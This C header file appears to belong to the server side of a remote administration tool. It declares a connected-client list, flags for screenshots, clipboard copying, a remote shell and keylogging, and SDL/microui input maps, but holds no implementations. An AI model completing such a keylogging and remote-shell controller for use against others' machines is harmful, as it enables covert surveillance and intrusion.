//
// Created by olive on 10/30/2024.
//

#ifndef SERVER_H
#define SERVER_H
// For Checkers...
// For whatever reason I had this as yes/no at first...
#define FALSE 0
#define TRUE 1

#define MAX_MEMORY_SIZE 1024

// Colours and panel details
char clientNumBuffer[1337] = "Click Client to Choose: ";

// Details
char cpuDetails[1024];
char memoryDetails[1024];
char userDetails[UNLEN + 1];

int upToId = 0;

// Running
boolean serverRunning = FALSE;
SOCKET sock;

// Functions
boolean screenshotFunction = FALSE;
boolean copyClipBoard = FALSE;

// Shell functionality
boolean shellFunction = FALSE;
boolean shellChecker = FALSE;

// Keylogging functionality
boolean keyloggingFunction = FALSE;
boolean keyloggingChecker = FALSE;
boolean killKeyLogging = FALSE;

// Linked list of all clients
typedef struct client {
    SOCKET client;
    struct sockaddr clientAddress;
    struct client* next;
    int id;

} client_t;

typedef struct shell_return {
    SOCKET shell;
    char* functionRunBytes;

    char* functionReturn;
} shellReturn_t;

void kill();
void free_client_list(client_t* client);
void keylogging();
void shell(SOCKET clientSocket);

const char buttonMap[256] = {
    [SDL_BUTTON_LEFT & 0xff] = MU_MOUSE_LEFT,
    [SDL_BUTTON_RIGHT & 0xff] = MU_MOUSE_RIGHT,
    [SDL_BUTTON_MIDDLE & 0xff] = MU_MOUSE_MIDDLE
};

const char keyMap[256] = {
    [SDLK_LSHIFT & 0xff] = MU_KEY_SHIFT,
    [SDLK_RSHIFT & 0xff] = MU_KEY_SHIFT,
    [SDLK_LCTRL & 0xff] = MU_KEY_CTRL,
    [SDLK_RCTRL & 0xff] = MU_KEY_CTRL,
    [SDLK_LALT & 0xff] = MU_KEY_ALT,
    [SDLK_RALT & 0xff] = MU_KEY_ALT,
    [SDLK_RETURN & 0xff] = MU_KEY_RETURN,
    [SDLK_BACKSPACE & 0xff] = MU_KEY_BACKSPACE
};

int num_keys[] = {
    0x30,// 0 Key
    0x31,// 1 Key
    0x32,// 2 Key
    0x33,// 3 Key
    0x34,// 4 Key
    0x35,// 5 Key
    0x36,// 6 Key
    0x37,// 7 Key
    0x38,// 8 Key
    0x39,// 9 Key
    0x0D // Return Key
};

#endif //SERVER_H
